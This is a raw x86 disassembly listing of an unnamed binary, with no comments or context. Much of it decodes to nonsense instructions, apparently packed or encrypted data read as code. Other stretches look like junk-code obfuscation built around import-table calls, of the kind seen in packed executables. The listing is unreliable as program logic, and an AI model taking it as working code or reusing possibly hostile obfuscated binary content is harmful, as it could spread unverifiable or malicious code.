  41c181:	sbb    BYTE PTR [esp+ebp*1+0x68],bl
  41c185:	dec    ebp
  41c186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c187:	retf   
  41c188:	sub    cl,BYTE PTR [eax+0x2f]
  41c18b:	xchg   ebx,eax
  41c18c:	scas   al,BYTE PTR es:[edi]
  41c18d:	pop    es
  41c18e:	pop    ss
  41c18f:	imul   ebx,esi,0x37
  41c192:	data16 mov dh,0x3a
  41c195:	cmp    DWORD PTR [ecx-0x28824f50],esi
  41c19b:	dec    edi
  41c19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c19d:	js     0x41c1cd
  41c19f:	outs   dx,BYTE PTR ds:[esi]
  41c1a0:	push   0x7ede79ea
  41c1a5:	xor    ah,dl
  41c1a7:	ror    DWORD PTR [edi-0x4f],1
  41c1aa:	call   FWORD PTR [ebp+0x3c]
  41c1ad:	imul   esp,DWORD PTR [ecx+esi*2],0x78
  41c1b1:	jno    0x41c1e4
  41c1b3:	retf   0xbf
  41c1b6:	int    0xe0
  41c1b8:	sbb    eax,0x87963fed
  41c1bd:	arpl   WORD PTR [esi+ebp*8-0x32537c6c],si
  41c1c4:	push   edx
  41c1c5:	stos   BYTE PTR es:[edi],al
  41c1c6:	loop   0x41c17c
  41c1c8:	loop   0x41c1b2
  41c1ca:	jnp    0x41c177
  41c1cc:	ficom  DWORD PTR [eax]
  41c1ce:	jne    0x41c221
  41c1d0:	(bad)  
  41c1d1:	loop   0x41c220
  41c1d3:	add    cl,BYTE PTR [esi]
  41c1d5:	mov    DWORD PTR [ecx+ecx*1-0x7fa70ebd],ebx
  41c1dc:	inc    esi
  41c1dd:	inc    esi
  41c1de:	inc    ebp
  41c1df:	mov    WORD PTR [ebx-0x53],ds
  41c1e2:	or     DWORD PTR es:[esp+ebp*2],0xffffff81
  41c1e7:	adc    eax,0x17b29eba
  41c1ec:	retf   
  41c1ed:	mov    ebx,0x896a5aae
  41c1f2:	or     eax,0x2eaba2f6
  41c1f7:	jp     0x41c256
  41c1f9:	or     BYTE PTR [esi],ah
  41c1fb:	jns    0x41c226
  41c1fd:	pop    es
  41c1fe:	and    al,0x14
  41c200:	imul   edx,edx,0x7954010
  41c206:	push   ds
  41c207:	icebp  
  41c208:	shr    DWORD PTR [ecx+0x115ea549],0x4d
  41c20f:	push   0x606d8af9
  41c214:	xchg   ebx,eax
  41c215:	ror    BYTE PTR [ebp+0x9],1
  41c218:	xor    BYTE PTR [edi],0xfa
  41c21b:	loope  0x41c1ad
  41c21d:	jnp    0x41c270
  41c21f:	nop
  41c220:	enter  0x341d,0xa8
  41c224:	jnp    0x41c1eb
  41c226:	es ja  0x41c262
  41c229:	cmp    bh,dh
  41c22b:	xor    ebp,edi
  41c22d:	mov    dh,0xc8
  41c22f:	into   
  41c230:	mov    BYTE PTR [esi],ah
  41c232:	out    dx,al
  41c233:	pop    ecx
  41c234:	pusha  
  41c235:	cmc    
  41c236:	(bad)  
  41c237:	cmp    DWORD PTR [ebx+0x54],edx
  41c23a:	mov    ch,0x67
  41c23c:	cmp    BYTE PTR [ecx+0x2d0210ca],ch
  41c242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c243:	lock lods eax,DWORD PTR ds:[esi]
  41c245:	sub    eax,0x6eadff53
  41c24a:	jnp    0x41c262
  41c24c:	cmovg  ebp,DWORD PTR [ebx]
  41c24f:	mov    edi,eax
  41c251:	sub    ecx,DWORD PTR [esi-0x4187943c]
  41c257:	xor    al,0x73
  41c259:	dec    esi
  41c25a:	add    DWORD PTR [eax],0x1c5a312b
  41c260:	mov    ebx,0x3bbea026
  41c265:	inc    edi
  41c266:	pop    esi
  41c267:	arpl   ax,di
  41c269:	dec    esi
  41c26a:	rcl    DWORD PTR [ecx+edi*4+0x11],cl
  41c26e:	in     al,0x16
  41c270:	sti    
  41c271:	mov    DWORD PTR [ebx-0x72],edi
  41c274:	push   ds
  41c275:	or     ch,BYTE PTR [edi+0x5a]
  41c278:	fmul   QWORD PTR [eax+0x1fff7a1b]
  41c27e:	in     eax,0x96
  41c280:	jmp    0x65ebd231
  41c285:	pusha  
  41c286:	pusha  
  41c287:	mov    eax,ds:0x565b15f7
  41c28c:	shr    DWORD PTR [edx-0x2cd0af31],0x31
  41c293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c294:	or     BYTE PTR [ebx-0x26],bl
  41c297:	enter  0x7439,0xbf
  41c29b:	outs   dx,DWORD PTR ds:[esi]
  41c29c:	cmp    al,0xb0
  41c29e:	sbb    dl,BYTE PTR gs:[esi+0x1a]
  41c2a2:	jl     0x41c2f0
  41c2a4:	sub    ch,BYTE PTR [ebp-0x36]
  41c2a7:	dec    esp
  41c2a8:	outs   dx,BYTE PTR ds:[esi]
  41c2a9:	push   edx
  41c2aa:	inc    ebp
  41c2ab:	jb     0x41c24e
  41c2ad:	fidivr WORD PTR [ecx]
  41c2af:	dec    eax
  41c2b0:	mov    esp,ebx
  41c2b2:	test   eax,0xcff81827
  41c2b7:	sbb    al,0x5d
  41c2b9:	inc    esi
  41c2ba:	in     eax,0x47
  41c2bc:	adc    ebp,0xffffffc7
  41c2bf:	imul   esi,DWORD PTR [edi+ecx*4+0x4],0xffffffdc
  41c2c4:	push   0x93a1310
  41c2c9:	(bad)  
  41c2ca:	retf   0x4dbc
  41c2cd:	in     al,0x66
  41c2cf:	pop    eax
  41c2d0:	(bad)  
  41c2d2:	adc    bh,BYTE PTR ds:0xaeebd2a9
  41c2d8:	and    eax,0xdeb2d7f1
  41c2dd:	mov    dh,0x8a
  41c2df:	sbb    ebp,DWORD PTR [esi]
  41c2e1:	stos   BYTE PTR es:[edi],al
  41c2e2:	jns    0x41c289
  41c2e4:	mov    ebx,DWORD PTR [edi]
  41c2e6:	push   eax
  41c2e7:	es arpl bx,ax
  41c2ea:	push   ss
  41c2eb:	adc    edi,ebp
  41c2ed:	stc    
  41c2ee:	cwde   
  41c2ef:	fcmovnbe st,st(3)
  41c2f1:	adc    eax,0x6ccd7c11
  41c2f6:	clc    
  41c2f7:	sbb    al,0x2
  41c2f9:	mov    bl,0xa1
  41c2fb:	xlat   BYTE PTR ds:[ebx]
  41c2fc:	sub    eax,0xff46cfd
  41c301:	and    bl,BYTE PTR [edi]
  41c303:	repnz sbb BYTE PTR [edx+eiz*2-0x55],cl
  41c308:	je     0x41c389
  41c30a:	bound  edx,QWORD PTR [edi+0x50dd7bb7]
  41c310:	jnp    0x41c350
  41c312:	not    BYTE PTR [esi]
  41c314:	mov    WORD PTR [ebx+0x57ae12f5],?
  41c31a:	daa    
  41c31b:	xor    eax,0x5e8c
  41c320:	mov    DWORD PTR [ebp-0x48],eax
  41c323:	sbb    DWORD PTR ds:0x4284d5,edi
  41c329:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41c333:	mov    DWORD PTR [ebp-0x138],0x1169
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x428545,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x4284b9,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x428415,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42855d,0x0
  41c374:	mov    DWORD PTR ds:0x428409,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x4284e9,0x3a72
  41c388:	mov    DWORD PTR ds:0x42832d,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x4284cd
  41c39c:	cmp    DWORD PTR ds:0x42855d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x4283f9,edx
  41c3be:	sub    DWORD PTR ds:0x428359,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42835d,0x428569
  41c3d2:	or     DWORD PTR ds:0x428539,edi
  41c3d8:	sbb    DWORD PTR ds:0x428355,0x428545
  41c3e2:	cmp    DWORD PTR ds:0x428461,0x0
  41c3e9:	mov    DWORD PTR ds:0x428431,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x428441,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428455,0x897
  41c407:	mov    DWORD PTR ds:0x428349,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x4284bd
  41c422:	cmp    DWORD PTR ds:0x428461,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x4283f5,ecx
  41c44f:	not    DWORD PTR ds:0x4284c9
  41c455:	adc    DWORD PTR ds:0x428439,0x2c56
  41c45f:	add    DWORD PTR ds:0x4284e5,0x42841d
  41c469:	add    DWORD PTR ds:0x4283fd,edi
  41c46f:	sub    DWORD PTR ds:0x42846d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x428425,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428455
  41c493:	add    DWORD PTR ds:0x42856d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428569,0x0
  41c4a8:	mov    DWORD PTR ds:0x42844d,0x420b
  41c4b2:	mov    DWORD PTR ds:0x4284c9,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428469,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x428409,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428569,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x428449,0x4284d9
  41c4ff:	add    DWORD PTR ds:0x42833d,edi
  41c505:	xor    DWORD PTR ds:0x42840d,edx
  41c50b:	sbb    DWORD PTR ds:0x428455,0x428445
  41c515:	mov    DWORD PTR ds:0x428469,0x491d
  41c51f:	add    DWORD PTR ds:0x428341,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	add    edx,DWORD PTR [ebp+0x6c]
  41c539:	shl    DWORD PTR [eax+0x41],1
  41c53c:	sar    BYTE PTR [esi-0x41413bb6],0xfd
  41c543:	sbb    al,0x73
  41c545:	fnstenv [ebp+0xe]
  41c548:	jno    0x41c5b5
  41c54a:	mov    eax,0xb695a588
  41c54f:	jne    0x41c573
  41c551:	inc    ecx
  41c552:	test   eax,0xdc5ad2e2
  41c557:	das    
  41c558:	jmp    0x41c54a
  41c55a:	dec    ebx
  41c55b:	sbb    BYTE PTR [ebx+0x310b7849],cl
  41c561:	std    
  41c562:	cmc    
  41c563:	sbb    DWORD PTR [ecx+0x3a],0xffffffd2
  41c567:	or     eax,DWORD PTR [ebx*4-0x4ac1d017]
  41c56e:	jnp    0x41c5bc
  41c570:	adc    DWORD PTR [ecx],0x2be2336c
  41c576:	aam    0x1f
  41c578:	popf   
  41c579:	ins    DWORD PTR es:[edi],dx
  41c57a:	in     eax,0xb8
  41c57c:	fimul  WORD PTR [ecx]
  41c57e:	pop    ecx
  41c57f:	sbb    bl,cl
  41c581:	sahf   
  41c582:	and    al,0x1a
  41c584:	xor    al,0xec
  41c586:	or     eax,0xfb659aec
  41c58b:	(bad)  
  41c58c:	loop   0x41c5e9
  41c58e:	rol    DWORD PTR [esi],0xce
  41c591:	jge    0x41c5ca
  41c593:	aaa    
  41c594:	inc    ecx
  41c595:	pushf  
  41c596:	jnp    0x41c598
  41c598:	dec    eax
  41c599:	js     0x41c5b5
  41c59b:	mov    ah,0x4b
  41c59d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c59e:	and    BYTE PTR [esi+0x9],al
  41c5a1:	jge    0x41c549
  41c5a3:	ret    
  41c5a4:	ja     0x41c5c5
  41c5a6:	jle    0x41c5e8
  41c5a8:	inc    ebx
  41c5a9:	or     BYTE PTR [ecx],bl
  41c5ab:	mov    bh,0xd2
  41c5ad:	xchg   edx,esi
  41c5af:	jo     0x41c62e
  41c5b1:	in     eax,dx
  41c5b2:	imul   cl
  41c5b4:	dec    eax
  41c5b5:	mov    esp,0x286be1c8
  41c5ba:	cdq    
  41c5bb:	pusha  
  41c5bc:	jns    0x41c555
  41c5be:	sbb    al,0x28
  41c5c0:	and    edx,DWORD PTR [eax-0x53]
  41c5c3:	sbb    BYTE PTR [esi-0x6ee09596],bl
  41c5c9:	fstp   DWORD PTR [eax]
  41c5cb:	add    al,0xed
  41c5cd:	sub    DWORD PTR [edx-0x7847fa68],ebx
  41c5d3:	mov    ds:0xf39f2a4b,al
  41c5d8:	xor    eax,0x39437624
  41c5dd:	cld    
  41c5de:	mov    esp,0xcfa9825b
  41c5e3:	cld    
  41c5e4:	or     eax,0xb3f0a808
  41c5e9:	inc    edi
  41c5ea:	lods   al,BYTE PTR ds:[esi]
  41c5eb:	nop
  41c5ec:	lods   al,BYTE PTR ds:[esi]
  41c5ed:	inc    ax
  41c5ef:	data16 sbb al,BYTE PTR [ecx+0x1652f95]
  41c5f6:	push   edx
  41c5f7:	enter  0x65f8,0x53
  41c5fb:	and    ch,BYTE PTR [edx+0x3a]
  41c5fe:	dec    edi
  41c5ff:	add    DWORD PTR [ebx],0x1fc7142c
  41c605:	cmp    DWORD PTR [eax-0x2f],esp
  41c608:	inc    edx
  41c609:	push   ebx
  41c60a:	jns    0x41c688
  41c60c:	test   BYTE PTR [eax+esi*1],0x19
  41c610:	out    0xe1,al
  41c612:	inc    ebx
  41c613:	xchg   esp,eax
  41c614:	sbb    ebx,DWORD PTR [edx]
  41c616:	mov    ah,0x3c
  41c618:	(bad)  [ecx+0x65bc9fb0]
  41c61e:	mov    ebp,0xabea2cd0
  41c623:	pop    esp
  41c624:	retf   
  41c625:	or     eax,0x3aea0401
  41c62a:	daa    
  41c62b:	int3   
  41c62c:	ds inc eax
  41c62e:	sub    ebp,DWORD PTR [esi+0x6157e84d]
  41c634:	imul   esi,DWORD PTR [edi+0x352f8cd4],0x4b
  41c63b:	cdq    
  41c63c:	neg    BYTE PTR [edx+esi*2-0x4f20c314]
  41c643:	sbb    BYTE PTR [edi+edx*1],dh
  41c646:	inc    ebp
  41c647:	xchg   ebp,eax
  41c648:	inc    eax
  41c649:	lahf   
  41c64a:	add    DWORD PTR ds:0xfa5d,edi
  41c64f:	in     al,dx
  41c650:	mov    ds:0xaa069edc,eax
  41c655:	xchg   ebp,eax
  41c656:	jnp    0x41c626
  41c658:	adc    al,0x1f
  41c65a:	scas   eax,DWORD PTR es:[edi]
  41c65b:	shl    DWORD PTR [edx+0x41],cl
  41c65e:	(bad)  
  41c660:	mov    eax,0x3f17894c
  41c665:	cmp    bh,0x23
  41c668:	dec    ebp
  41c669:	sbb    esi,DWORD PTR [ebp-0x7c]
  41c66c:	call   0xf33d:0xf63951f8
  41c673:	lods   eax,DWORD PTR ds:[esi]
  41c674:	(bad)  
  41c675:	out    dx,al
  41c676:	xchg   DWORD PTR [eax-0x39367e0f],edx
  41c67c:	repz mov dl,0x73
  41c67f:	retf   0xd2ea
  41c682:	sub    eax,0xe221f545
  41c687:	inc    edi
  41c688:	inc    eax
  41c689:	dec    edi
  41c68a:	in     eax,0x76
  41c68c:	adc    BYTE PTR [esi+0x1d],dl
  41c68f:	cmp    bh,BYTE PTR [edx+0x27]
  41c692:	rcl    DWORD PTR [ebx+0x5d],0x2
  41c696:	arpl   WORD PTR [ebx+0x50],sp
  41c699:	dec    ebx
  41c69a:	push   edx
  41c69b:	add    dh,ah
  41c69d:	aad    0x3f
  41c69f:	xor    al,0x59
  41c6a1:	int3   
  41c6a2:	mov    eax,ds:0x53779863
  41c6a7:	iret   
  41c6a8:	daa    
  41c6a9:	pop    ss
  41c6aa:	pop    edi
  41c6ab:	in     al,0x3a
  41c6ad:	(bad)  
  41c6ae:	mov    bl,BYTE PTR [edx]
  41c6b0:	fild   DWORD PTR [edi-0x2345ed45]
  41c6b6:	jecxz  0x41c70b
  41c6b8:	rcl    bl,cl
  41c6ba:	imul   ebp,ecx,0x613c66df
  41c6c0:	arpl   WORD PTR [ebp-0x4c391bb8],si
  41c6c6:	cmp    bh,cl
  41c6c8:	jecxz  0x41c68c
  41c6ca:	scas   al,BYTE PTR es:[edi]
  41c6cb:	sub    BYTE PTR [ebp+0x47],dh
  41c6ce:	(bad)  [edi+0x18808b0a]
  41c6d4:	(bad)  
  41c6d5:	call   0xa451:0xd99cfd57
  41c6dc:	lods   eax,DWORD PTR ds:[esi]
  41c6dd:	mov    al,0x15
  41c6df:	xlat   BYTE PTR ds:[ebx]
  41c6e0:	rcl    BYTE PTR [edx-0x5a92542f],cl
  41c6e6:	xor    al,0x77
  41c6e8:	div    eax
  41c6ea:	pusha  
  41c6eb:	iret   
  41c6ec:	and    dl,ch
  41c6ee:	cpuid  
  41c6f0:	stc    
  41c6f1:	ins    BYTE PTR es:[edi],dx
  41c6f2:	bound  ecx,QWORD PTR [eax-0x3a22efb4]
  41c6f8:	(bad)  
  41c6fa:	push   es
  41c6fb:	dec    ebp
  41c6fc:	lds    eax,FWORD PTR ds:[esi+0x4]
  41c700:	inc    esi
  41c701:	cdq    
  41c702:	lods   al,BYTE PTR es:[esi]
  41c704:	inc    esi
  41c705:	repz jge 0x41c706
  41c708:	stc    
  41c709:	and    bl,BYTE PTR [ebx]
  41c70b:	ret    0x4a72
  41c70e:	or     eax,0xd674de4b
  41c713:	jne    0x41c753
  41c715:	cmp    al,0x9e
  41c717:	popa   
  41c718:	jl     0x41c6fc
  41c71a:	lahf   
  41c71b:	movaps xmm2,XMMWORD PTR [esi-0x6a56fb6e]
  41c722:	in     al,dx
  41c723:	sahf   
  41c724:	test   eax,0x5fa7c1da
  41c729:	mov    esi,?
  41c72b:	pushf  
  41c72c:	inc    esi
  41c72d:	dec    ebp
  41c72e:	ja     0x41c73a
  41c730:	jecxz  0x41c6f7
  41c732:	and    al,0xe
  41c734:	push   esp
  41c735:	and    DWORD PTR [ecx-0x1ac1d87f],eax
  41c73b:	mov    esi,0x53ee4154
  41c740:	iret   
  41c741:	dec    ebx
  41c742:	add    DWORD PTR [edx-0x63],edi
  41c745:	sub    DWORD PTR [edi-0x66ecd97e],esi
  41c74b:	jecxz  0x41c6cf
  41c74d:	dec    ebx
  41c74e:	dec    ebp
  41c74f:	and    DWORD PTR [eax+eax*2-0x20409ae7],0x9a5f41e4
  41c75a:	ss pushf 
  41c75c:	jl     0x41c759
  41c75e:	or     al,0xd2
  41c760:	jmp    0x41c76e
  41c762:	(bad)  
  41c763:	in     eax,0x41
  41c765:	ss mov dl,0x77
  41c768:	stc    
  41c769:	enter  0xbf66,0xab
  41c76d:	scas   eax,DWORD PTR es:[edi]
  41c76e:	aas    
  41c76f:	inc    ebp
  41c770:	sti    
  41c771:	adc    eax,0x76a2304
  41c776:	add    ecx,DWORD PTR ds:0x6c1ca2a0
  41c77c:	inc    esp
  41c77d:	aam    0x3b
  41c77f:	ins    BYTE PTR es:[edi],dx
  41c780:	add    DWORD PTR [edi+esi*1],edi
  41c783:	call   0xf24fe4ed
  41c788:	push   esp
  41c789:	popf   
  41c78a:	je     0x41c70c
  41c78c:	inc    edx
  41c78d:	out    dx,al
  41c78e:	ss cmp bl,cl
  41c791:	mov    ch,0xcf
  41c793:	xchg   bl,bh
  41c795:	fs push di
  41c798:	mov    al,0x6d
  41c79a:	or     bl,BYTE PTR [edi+esi*8]
  41c79d:	add    al,0x29
  41c79f:	fisubr WORD PTR [esi-0x64]
  41c7a2:	xor    edx,DWORD PTR [esp+edx*8-0x38]
  41c7a6:	add    eax,ecx
  41c7a8:	call   0xbc4c:0x8201caa9
  41c7af:	je     0x41c7ce
  41c7b1:	sbb    eax,DWORD PTR [edx-0x7f87709d]
  41c7b7:	and    BYTE PTR [edx],al
  41c7b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7ba:	imul   esi,DWORD PTR [ecx+edx*1+0x24cae0e6],0x0
  41c7c2:	sbb    dh,BYTE PTR [esi+eiz*8-0x43]
  41c7c6:	rcr    esi,1
  41c7c8:	aaa    
  41c7c9:	mov    ebx,0x590f906
  41c7ce:	fdivr  QWORD PTR [edx-0x4a3967ba]
  41c7d4:	dec    edx
  41c7d5:	push   ds
  41c7d6:	ins    DWORD PTR es:[edi],dx
  41c7d7:	hlt    
  41c7d8:	jo     0x41c830
  41c7da:	jnp    0x41c7de
  41c7dc:	adc    BYTE PTR [bp-0x33],ah
  41c7e0:	mov    bl,BYTE PTR [edi]
  41c7e2:	push   ebx
  41c7e3:	in     eax,0x62
  41c7e5:	mov    dl,0x68
  41c7e7:	iret   
  41c7e8:	inc    edi
  41c7e9:	popa   
  41c7ea:	pusha  
  41c7eb:	dec    ecx
  41c7ec:	imul   edx,DWORD PTR [ebp-0x6a],0x47f00c97
  41c7f3:	add    DWORD PTR [eax+0x798f4c82],edi
  41c7f9:	pop    edx
  41c7fa:	test   DWORD PTR [esi+ebp*2+0x50],eax
  41c7fe:	adc    eax,0xae4fabf3
  41c803:	jmp    0x940f:0x2ab23030
  41c80a:	mov    esi,0x83bfb9d9
  41c80f:	xchg   ebp,eax
  41c810:	rol    BYTE PTR [edi],cl
  41c812:	sbb    al,0x96
  41c814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c815:	add    DWORD PTR [esi],esp
  41c817:	push   ebp
  41c818:	stos   BYTE PTR es:[edi],al
  41c819:	stos   BYTE PTR es:[edi],al
  41c81a:	mov    bl,0x7c
  41c81c:	aad    0x7a
  41c81e:	xchg   esp,eax
  41c81f:	mov    ebx,0xa5a6b5ee
  41c824:	sbb    ebx,esp
  41c826:	and    bl,BYTE PTR [esi]
  41c828:	push   edx
  41c829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c82a:	in     al,dx
  41c82b:	sub    bh,BYTE PTR [edi+0x799bb70e]
  41c831:	inc    esp
  41c832:	sbb    edi,esp
  41c834:	sub    edi,ebx
  41c836:	ror    DWORD PTR [edx],1
  41c838:	enter  0x1b70,0xe2
  41c83c:	out    dx,al
  41c83d:	call   0xa736:0xa68d7591
  41c844:	fidiv  DWORD PTR [eax-0x71]
  41c847:	(bad)  
  41c848:	dec    esi
  41c849:	fiadd  DWORD PTR [esi+0x68]
  41c84c:	shr    DWORD PTR [eax-0x2934eb41],0x86
  41c853:	sub    DWORD PTR [ebx-0xaa40532],ebx
  41c859:	or     bh,al
  41c85b:	pusha  
  41c85c:	retf   
  41c85d:	xchg   ebp,eax
  41c85e:	mov    WORD PTR fs:[edx],?
  41c861:	call   0x6531:0x1203432d
  41c868:	dec    esp
  41c869:	shr    DWORD PTR ds:0x87a5a5c2,1
  41c86f:	ret    
  41c870:	or     esi,ebp
  41c872:	xchg   esp,eax
  41c873:	cli    
  41c874:	inc    ecx
  41c875:	das    
  41c876:	and    DWORD PTR [esi-0x5d],ebp
  41c879:	jae    0x41c88a
  41c87b:	scas   al,BYTE PTR es:[edi]
  41c87c:	sahf   
  41c87d:	lahf   
  41c87e:	ficomp DWORD PTR [ebx-0x3dd7cf8c]
  41c884:	add    eax,0xb8f3f036
  41c889:	sbb    cl,BYTE PTR [esi]
  41c88b:	xor    esi,DWORD PTR [edx-0x108c3c49]
  41c891:	xchg   ecx,eax
  41c892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c893:	adc    ebx,ebx
  41c895:	dec    eax
  41c896:	inc    eax
  41c897:	scas   eax,DWORD PTR es:[edi]
  41c898:	(bad)  [ebp-0x79]
  41c89b:	mov    ds:0x65ed9610,eax
  41c8a0:	adc    esi,DWORD PTR [esi]
  41c8a2:	cmp    eax,0x29fba7d4
  41c8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8a8:	lahf   
  41c8a9:	adc    edi,DWORD PTR [edx]
  41c8ab:	adc    DWORD PTR [ebp+0x75],edx
  41c8ae:	pop    es
  41c8af:	dec    ebx
  41c8b0:	test   al,0x77
  41c8b2:	push   edi
  41c8b3:	ins    BYTE PTR es:[edi],dx
  41c8b4:	pop    es
  41c8b5:	js     0x41c8ca
  41c8b7:	add    BYTE PTR [ecx-0x3d],dl
  41c8ba:	jmp    0x2aba:0x675428d
  41c8c1:	push   esp
  41c8c2:	sbb    edx,esp
  41c8c4:	push   esp
  41c8c5:	xor    eax,0x5bf91fd1
  41c8ca:	inc    ecx
  41c8cb:	test   BYTE PTR [esi*2+0x49ea4d35],ch
  41c8d2:	aaa    
  41c8d3:	or     al,0x9f
  41c8d5:	push   ebx
  41c8d6:	inc    ebp
  41c8d7:	ja     0x41c94f
  41c8d9:	lods   al,BYTE PTR ds:[esi]
  41c8da:	adc    ebp,ecx
  41c8dc:	sar    BYTE PTR [ecx],0x2f
  41c8df:	mov    dh,0x4b
  41c8e1:	mov    eax,ds:0xc63a9528
  41c8e6:	pusha  
  41c8e7:	mov    edx,0x6ee12d40
  41c8ec:	hlt    
  41c8ed:	xchg   DWORD PTR [ebx-0x33],ebx
  41c8f0:	inc    ebp
  41c8f1:	or     eax,0x85358f6
  41c8f6:	cmp    eax,ecx
  41c8f8:	sub    eax,0x8c8607df
  41c8fd:	retf   0xbe8
  41c900:	sbb    DWORD PTR [eax],0x43d06a36
  41c906:	mov    WORD PTR [ecx],?
  41c908:	icebp  
  41c909:	lds    ebp,FWORD PTR [ebx+0x3b18b8e2]
  41c90f:	add    BYTE PTR [eax],al
  41c911:	or     DWORD PTR ds:0x42856d,0x428405
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42846d
  41c923:	sbb    ecx,DWORD PTR ds:0x4284c9
  41c929:	mov    DWORD PTR ds:0x42846d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x428349
  41c93c:	sub    eax,DWORD PTR ds:0x428329
  41c942:	mov    ds:0x428349,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42856d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x428331,0x48a0
  41c974:	jmp    0x41c9c9
  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42856d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42846d
  41c99d:	sbb    DWORD PTR ds:0x428459,ecx
  41c9a3:	xor    DWORD PTR ds:0x42855d,edx
  41c9a9:	mov    DWORD PTR ds:0x4284d1,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x428445,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428555
  41c9bf:	sub    DWORD PTR ds:0x428421,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x42841d,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x4284b5,ecx
  41c9e5:	mov    DWORD PTR ds:0x428459,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428355,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x42841d,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x428349
  41ca23:	xor    ecx,DWORD PTR ds:0x42841d
  41ca29:	adc    DWORD PTR ds:0x42831d,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x42841d
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42846d,0x428451
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428351
  41ca4e:	xor    DWORD PTR ds:0x428541,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x428349
  41ca5f:	sub    ecx,DWORD PTR ds:0x4284d9
  41ca65:	mov    DWORD PTR ds:0x428349,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x4284f1,0xac
  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x428435,0x0
  41ca8c:	mov    DWORD PTR ds:0x428341,edi
